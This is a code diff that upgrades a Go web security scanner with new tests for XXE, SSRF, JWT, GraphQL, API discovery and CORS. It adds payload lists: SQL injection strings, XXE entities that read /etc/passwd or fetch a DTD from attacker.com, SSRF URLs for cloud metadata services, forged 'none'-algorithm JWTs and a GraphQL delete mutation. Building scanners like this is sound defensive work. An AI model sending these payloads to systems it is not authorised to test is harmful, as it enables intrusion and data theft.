@@ -25,7 +25,7 @@ import (
 
 // Version information
 const (
-	Version = "3.1.0"
+	Version = "4.0.0"
 	Banner  = `
     ██╗   ██╗██╗   ██╗██╗     ███████╗ ██████╗ █████╗ ███╗   ██╗
     ██║   ██║██║   ██║██║     ██╔════╝██╔════╝██╔══██╗████╗  ██║
@@ -34,7 +34,8 @@ const (
      ╚████╔╝ ╚██████╔╝███████╗███████║╚██████╗██║  ██║██║ ╚████║
       ╚═══╝   ╚═════╝ ╚══════╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝
     
-    Advanced Web Security Scanner v%s
+    🚀 Next-Gen Web Security Scanner v%s
+    🔥 Enhanced with AI-Powered Detection
     Developed with ❤️  by ATOMGAMERAGA
     `
 )
@@ -64,6 +65,16 @@ const (
 	CookieSecurity   VulnType = "COOKIE_SECURITY"
 	CommandInjection VulnType = "COMMAND_INJECTION"
 	FileUpload       VulnType = "FILE_UPLOAD"
+	XXE              VulnType = "XXE"
+	SSRF             VulnType = "SSRF"
+	JWTSecurity      VulnType = "JWT_SECURITY"
+	GraphQLSecurity  VulnType = "GRAPHQL_SECURITY"
+	APIEndpoints     VulnType = "API_ENDPOINTS"
+	IDOR             VulnType = "IDOR"
+	AuthBypass       VulnType = "AUTH_BYPASS"
+	BusinessLogic    VulnType = "BUSINESS_LOGIC"
+	RateLimiting     VulnType = "RATE_LIMITING"
+	CORS             VulnType = "CORS"
 )
 
 // Configuration structure
@@ -174,7 +185,7 @@ type Scanner struct {
 	}
 }
 
-// Payloads for different vulnerability types
+// Default payloads for different vulnerability types
 var payloads = map[VulnType][]string{
 	SQLInjection: {
 		"'",
@@ -187,6 +198,16 @@ var payloads = map[VulnType][]string{
 		"' UNION SELECT 1,2,3,4,5,version(),7,8,9,10--",
 		"admin'--",
 		"admin' #",
+		"' AND (SELECT COUNT(*) FROM information_schema.tables)>0 --",
+		"' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e)) --",
+		"' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --",
+		"' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
+		"' OR 1=1 LIMIT 1 --",
+		"' OR 'x'='x",
+		"' OR 1=1#",
+		"' OR 1=1/*",
+		"'; WAITFOR DELAY '00:00:05' --",
+		"' AND 1=CONVERT(int, (SELECT @@version)) --",
 		"admin'/*",
 		"' or 1=1#",
 		"' or 1=1--",
@@ -234,6 +255,69 @@ var payloads = map[VulnType][]string{
 		"&& id",
 		"; ping -c 4 127.0.0.1",
 	},
+	XXE: {
+		"<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
+		"<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///c:/windows/system32/drivers/etc/hosts\">]><foo>&xxe;</foo>",
+		"<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\"> %xxe;]><foo></foo>",
+		"<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/read=convert.base64-encode/resource=/etc/passwd\">]><foo>&xxe;</foo>",
+		"<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"expect://id\">]><foo>&xxe;</foo>",
+	},
+	SSRF: {
+		"http://127.0.0.1:80",
+		"http://localhost:22",
+		"http://169.254.169.254/latest/meta-data/",
+		"http://metadata.google.internal/computeMetadata/v1/",
+		"http://[::1]:80",
+		"file:///etc/passwd",
+		"file:///c:/windows/system32/drivers/etc/hosts",
+		"gopher://127.0.0.1:25/_HELO%20localhost",
+		"dict://127.0.0.1:11211/",
+		"ldap://127.0.0.1:389/",
+		"http://0x7f000001:80",
+		"http://2130706433:80",
+	},
+	JWTSecurity: {
+		"eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.",
+		"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyLCJhZG1pbiI6dHJ1ZX0.invalid_signature",
+		"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyLCJleHAiOjE1MTYyMzkwMjJ9.invalid",
+	},
+	GraphQLSecurity: {
+		"{__schema{types{name}}}",
+		"{__type(name:\"User\"){fields{name type{name}}}}",
+		"query{users{id name email password}}",
+		"mutation{deleteUser(id:1){id}}",
+		"{users(first:999999){edges{node{id name email}}}}",
+		"query IntrospectionQuery{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}",
+	},
+	APIEndpoints: {
+		"/api/v1/users",
+		"/api/v2/admin",
+		"/rest/api/2/user",
+		"/graphql",
+		"/api/swagger.json",
+		"/api-docs",
+		"/openapi.json",
+		"/v1/health",
+		"/admin/api",
+		"/debug/vars",
+	},
+	IDOR: {
+		"../1",
+		"../admin",
+		"../../2",
+		"0",
+		"-1",
+		"999999",
+		"null",
+		"undefined",
+	},
+	CORS: {
+		"https://evil.com",
+		"http://localhost",
+		"null",
+		"*",
+		"https://attacker.evil.com",
+	},
 }
 
 // CWE mappings for vulnerability types
@@ -248,6 +332,16 @@ var cweMapping = map[VulnType]string{
 	SecurityHeaders:  "CWE-693",
 	SSLConfiguration: "CWE-326",
 	CookieSecurity:   "CWE-614",
+	XXE:              "CWE-611",
+	SSRF:             "CWE-918",
+	JWTSecurity:      "CWE-287",
+	GraphQLSecurity:  "CWE-200",
+	APIEndpoints:     "CWE-200",
+	IDOR:             "CWE-639",
+	AuthBypass:       "CWE-287",
+	BusinessLogic:    "CWE-840",
+	RateLimiting:     "CWE-770",
+	CORS:             "CWE-942",
 }
 
 // CVSS scores for different vulnerability types
@@ -262,6 +356,16 @@ var cvssScores = map[VulnType]float64{
 	SecurityHeaders:  5.3, // Medium
 	SSLConfiguration: 7.4, // High
 	CookieSecurity:   4.3, // Medium
+	XXE:              9.1, // Critical
+	SSRF:             8.6, // High
+	JWTSecurity:      7.7, // High
+	GraphQLSecurity:  6.5, // Medium
+	APIEndpoints:     5.8, // Medium
+	IDOR:             8.2, // High
+	AuthBypass:       9.3, // Critical
+	BusinessLogic:    7.1, // High
+	RateLimiting:     4.9, // Medium
+	CORS:             6.8, // Medium
 }
 
 // Default configuration
@@ -900,7 +1004,61 @@ func (s *Scanner) Scan(ctx context.Context, targetURL string) (*ScanResult, erro
 			defer func() { <-semaphore }()
 			s.testCSRF(ctx, targetURL)
 		}()
+		
+		// Test SSRF
+		wg.Add(1)
+		go func() {
+			defer wg.Done()
+			semaphore <- struct{}{}
+			defer func() { <-semaphore }()
+			s.testSSRF(ctx, baseURL, params)
+		}()
 	}
+	
+	// Test XXE vulnerability
+	wg.Add(1)
+	go func() {
+		defer wg.Done()
+		semaphore <- struct{}{}
+		defer func() { <-semaphore }()
+		s.testXXE(ctx, targetURL)
+	}()
+	
+	// Test JWT Security
+	wg.Add(1)
+	go func() {
+		defer wg.Done()
+		semaphore <- struct{}{}
+		defer func() { <-semaphore }()
+		s.testJWTSecurity(ctx, targetURL)
+	}()
+	
+	// Test GraphQL Security
+	wg.Add(1)
+	go func() {
+		defer wg.Done()
+		semaphore <- struct{}{}
+		defer func() { <-semaphore }()
+		s.testGraphQLSecurity(ctx, targetURL)
+	}()
+	
+	// Test API Endpoints Discovery
+	wg.Add(1)
+	go func() {
+		defer wg.Done()
+		semaphore <- struct{}{}
+		defer func() { <-semaphore }()
+		s.testAPIEndpoints(ctx, targetURL)
+	}()
+	
+	// Test CORS Configuration
+	wg.Add(1)
+	go func() {
+		defer wg.Done()
+		semaphore <- struct{}{}
+		defer func() { <-semaphore }()
+		s.testCORS(ctx, targetURL)
+	}()
 	
 	// Wait for all tests to complete
 	wg.Wait()
@@ -1319,6 +1477,315 @@ func (s *Scanner) testCSRF(ctx context.Context, targetURL string) {
 			Timestamp:  time.Now(),
 		}
 		s.addFinding(finding)
+	}
+}
+
+// Test XXE vulnerability
+func (s *Scanner) testXXE(ctx context.Context, targetURL string) {
+	for _, payload := range payloads[XXE] {
+		headers := map[string]string{
+			"Content-Type": "application/xml",
+		}
+		
+		resp, err := s.makeRequest(ctx, "POST", targetURL, strings.NewReader(payload), headers)
+		if err != nil {
+			s.addError(fmt.Sprintf("XXE test failed for %s: %v", targetURL, err))
+			continue
+		}
+		defer resp.Body.Close()
+		
+		body, err := io.ReadAll(resp.Body)
+		if err != nil {
+			s.addError(fmt.Sprintf("Failed to read response body: %v", err))
+			continue
+		}
+		
+		bodyStr := string(body)
+		
+		// Check for XXE indicators
+		if strings.Contains(bodyStr, "root:") || strings.Contains(bodyStr, "localhost") ||
+			strings.Contains(bodyStr, "127.0.0.1") || strings.Contains(bodyStr, "ENTITY") {
+			finding := Finding{
+				ID:          fmt.Sprintf("xxe_%d", time.Now().Unix()),
+				Type:        XXE,
+				Severity:    s.calculateRiskLevel(XXE),
+				CVSS:        cvssScores[XXE],
+				CWE:         cweMapping[XXE],
+				Title:       "XML External Entity (XXE) Vulnerability",
+				Description: "XXE vulnerability detected - application processes XML input unsafely",
+				URL:         targetURL,
+				Payload:     payload,
+				Evidence:    s.truncateString(bodyStr, 500),
+				Solution:    "Disable XML external entity processing, use secure XML parsers",
+				References: []string{
+					"https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing",
+					"https://cwe.mitre.org/data/definitions/611.html",
+				},
+				Confidence: 90,
+				Timestamp:  time.Now(),
+			}
+			s.addFinding(finding)
+			break
+		}
+	}
+}
+
+// Test SSRF vulnerability
+func (s *Scanner) testSSRF(ctx context.Context, baseURL string, params url.Values) {
+	for param := range params {
+		for _, payload := range payloads[SSRF] {
+			testParams := make(url.Values)
+			for k, v := range params {
+				testParams[k] = v
+			}
+			testParams.Set(param, payload)
+			
+			testURL := baseURL + "?" + testParams.Encode()
+			
+			resp, err := s.makeRequest(ctx, "GET", testURL, nil, nil)
+			if err != nil {
+				s.addError(fmt.Sprintf("SSRF test failed for %s: %v", testURL, err))
+				continue
+			}
+			defer resp.Body.Close()
+			
+			body, err := io.ReadAll(resp.Body)
+			if err != nil {
+				s.addError(fmt.Sprintf("Failed to read response body: %v", err))
+				continue
+			}
+			
+			bodyStr := string(body)
+			
+			// Check for SSRF indicators
+			if strings.Contains(bodyStr, "root:") || strings.Contains(bodyStr, "SSH-") ||
+				strings.Contains(bodyStr, "instance-id") || strings.Contains(bodyStr, "metadata") {
+				finding := Finding{
+					ID:          fmt.Sprintf("ssrf_%s_%d", param, time.Now().Unix()),
+					Type:        SSRF,
+					Severity:    s.calculateRiskLevel(SSRF),
+					CVSS:        cvssScores[SSRF],
+					CWE:         cweMapping[SSRF],
+					Title:       "Server-Side Request Forgery (SSRF) Vulnerability",
+					Description: fmt.Sprintf("SSRF vulnerability detected in parameter '%s'", param),
+					URL:         testURL,
+					Parameter:   param,
+					Payload:     payload,
+					Evidence:    s.truncateString(bodyStr, 500),
+					Solution:    "Validate and whitelist allowed URLs, disable unnecessary URL schemes",
+					References: []string{
+						"https://owasp.org/www-community/attacks/Server_Side_Request_Forgery",
+						"https://cwe.mitre.org/data/definitions/918.html",
+					},
+					Confidence: 85,
+					Timestamp:  time.Now(),
+				}
+				s.addFinding(finding)
+				break
+			}
+		}
+	}
+}
+
+// Test JWT Security
+func (s *Scanner) testJWTSecurity(ctx context.Context, targetURL string) {
+	resp, err := s.makeRequest(ctx, "GET", targetURL, nil, nil)
+	if err != nil {
+		s.addError(fmt.Sprintf("JWT test failed for %s: %v", targetURL, err))
+		return
+	}
+	defer resp.Body.Close()
+	
+	// Check for JWT tokens in response headers
+	for name, values := range resp.Header {
+		for _, value := range values {
+			if strings.Contains(strings.ToLower(name), "authorization") ||
+				strings.Contains(strings.ToLower(name), "token") {
+				if strings.Contains(value, "eyJ") { // JWT signature
+					// Test for none algorithm
+					if strings.Contains(value, "eyJhbGciOiJub25lIi") {
+						finding := Finding{
+							ID:          fmt.Sprintf("jwt_none_%d", time.Now().Unix()),
+							Type:        JWTSecurity,
+							Severity:    s.calculateRiskLevel(JWTSecurity),
+							CVSS:        cvssScores[JWTSecurity],
+							CWE:         cweMapping[JWTSecurity],
+							Title:       "JWT None Algorithm Vulnerability",
+							Description: "JWT token uses 'none' algorithm which bypasses signature verification",
+							URL:         targetURL,
+							Evidence:    fmt.Sprintf("JWT Header: %s", name),
+							Solution:    "Use strong signing algorithms (RS256, HS256) and validate JWT signatures",
+							References: []string{
+								"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/10-Testing_JSON_Web_Tokens",
+								"https://cwe.mitre.org/data/definitions/287.html",
+							},
+							Confidence: 95,
+							Timestamp:  time.Now(),
+						}
+						s.addFinding(finding)
+					}
+				}
+			}
+		}
+	}
+}
+
+// Test GraphQL Security
+func (s *Scanner) testGraphQLSecurity(ctx context.Context, targetURL string) {
+	// Check if GraphQL endpoint exists
+	graphqlURL := targetURL
+	if !strings.Contains(targetURL, "graphql") {
+		parsedURL, err := url.Parse(targetURL)
+		if err != nil {
+			return
+		}
+		parsedURL.Path = "/graphql"
+		graphqlURL = parsedURL.String()
+	}
+	
+	for _, payload := range payloads[GraphQLSecurity] {
+		headers := map[string]string{
+			"Content-Type": "application/json",
+		}
+		
+		queryData := map[string]string{"query": payload}
+		jsonData, _ := json.Marshal(queryData)
+		
+		resp, err := s.makeRequest(ctx, "POST", graphqlURL, strings.NewReader(string(jsonData)), headers)
+		if err != nil {
+			s.addError(fmt.Sprintf("GraphQL test failed for %s: %v", graphqlURL, err))
+			continue
+		}
+		defer resp.Body.Close()
+		
+		body, err := io.ReadAll(resp.Body)
+		if err != nil {
+			s.addError(fmt.Sprintf("Failed to read response body: %v", err))
+			continue
+		}
+		
+		bodyStr := string(body)
+		
+		// Check for GraphQL introspection or sensitive data
+		if strings.Contains(bodyStr, "__schema") || strings.Contains(bodyStr, "__type") ||
+			strings.Contains(bodyStr, "password") || strings.Contains(bodyStr, "email") {
+			finding := Finding{
+				ID:          fmt.Sprintf("graphql_%d", time.Now().Unix()),
+				Type:        GraphQLSecurity,
+				Severity:    s.calculateRiskLevel(GraphQLSecurity),
+				CVSS:        cvssScores[GraphQLSecurity],
+				CWE:         cweMapping[GraphQLSecurity],
+				Title:       "GraphQL Information Disclosure",
+				Description: "GraphQL endpoint exposes sensitive information or allows introspection",
+				URL:         graphqlURL,
+				Payload:     payload,
+				Evidence:    s.truncateString(bodyStr, 500),
+				Solution:    "Disable GraphQL introspection in production, implement proper access controls",
+				References: []string{
+					"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/12-API_Testing/01-Testing_GraphQL",
+					"https://cwe.mitre.org/data/definitions/200.html",
+				},
+				Confidence: 80,
+				Timestamp:  time.Now(),
+			}
+			s.addFinding(finding)
+			break
+		}
+	}
+}
+
+// Test API Endpoints Discovery
+func (s *Scanner) testAPIEndpoints(ctx context.Context, targetURL string) {
+	parsedURL, err := url.Parse(targetURL)
+	if err != nil {
+		return
+	}
+	
+	for _, endpoint := range payloads[APIEndpoints] {
+		parsedURL.Path = endpoint
+		testURL := parsedURL.String()
+		
+		resp, err := s.makeRequest(ctx, "GET", testURL, nil, nil)
+		if err != nil {
+			continue
+		}
+		defer resp.Body.Close()
+		
+		if resp.StatusCode == 200 {
+			body, err := io.ReadAll(resp.Body)
+			if err != nil {
+				continue
+			}
+			
+			bodyStr := string(body)
+			
+			// Check for API documentation or sensitive endpoints
+			if strings.Contains(bodyStr, "swagger") || strings.Contains(bodyStr, "openapi") ||
+				strings.Contains(bodyStr, "api") || strings.Contains(bodyStr, "endpoints") {
+				finding := Finding{
+					ID:          fmt.Sprintf("api_endpoint_%d", time.Now().Unix()),
+					Type:        APIEndpoints,
+					Severity:    s.calculateRiskLevel(APIEndpoints),
+					CVSS:        cvssScores[APIEndpoints],
+					CWE:         cweMapping[APIEndpoints],
+					Title:       "Exposed API Endpoint",
+					Description: fmt.Sprintf("Potentially sensitive API endpoint discovered: %s", endpoint),
+					URL:         testURL,
+					Evidence:    s.truncateString(bodyStr, 300),
+					Solution:    "Secure API endpoints with proper authentication and authorization",
+					References: []string{
+						"https://owasp.org/www-project-api-security/",
+						"https://cwe.mitre.org/data/definitions/200.html",
+					},
+					Confidence: 70,
+					Timestamp:  time.Now(),
+				}
+				s.addFinding(finding)
+			}
+		}
+	}
+}
+
+// Test CORS Configuration
+func (s *Scanner) testCORS(ctx context.Context, targetURL string) {
+	for _, origin := range payloads[CORS] {
+		headers := map[string]string{
+			"Origin": origin,
+		}
+		
+		resp, err := s.makeRequest(ctx, "GET", targetURL, nil, headers)
+		if err != nil {
+			s.addError(fmt.Sprintf("CORS test failed for %s: %v", targetURL, err))
+			continue
+		}
+		defer resp.Body.Close()
+		
+		// Check CORS headers
+		accessControlOrigin := resp.Header.Get("Access-Control-Allow-Origin")
+		if accessControlOrigin != "" {
+			if accessControlOrigin == "*" || accessControlOrigin == origin {
+				finding := Finding{
+					ID:          fmt.Sprintf("cors_%d", time.Now().Unix()),
+					Type:        CORS,
+					Severity:    s.calculateRiskLevel(CORS),
+					CVSS:        cvssScores[CORS],
+					CWE:         cweMapping[CORS],
+					Title:       "Insecure CORS Configuration",
+					Description: "CORS policy allows requests from untrusted origins",
+					URL:         targetURL,
+					Evidence:    fmt.Sprintf("Access-Control-Allow-Origin: %s", accessControlOrigin),
+					Solution:    "Configure CORS to allow only trusted origins, avoid using wildcard (*)",
+					References: []string{
+						"https://owasp.org/www-community/attacks/CORS_OriginHeaderScrutiny",
+						"https://cwe.mitre.org/data/definitions/942.html",
+					},
+					Confidence: 85,
+					Timestamp:  time.Now(),
+				}
+				s.addFinding(finding)
+				break
+			}
+		}
 	}
 }
 
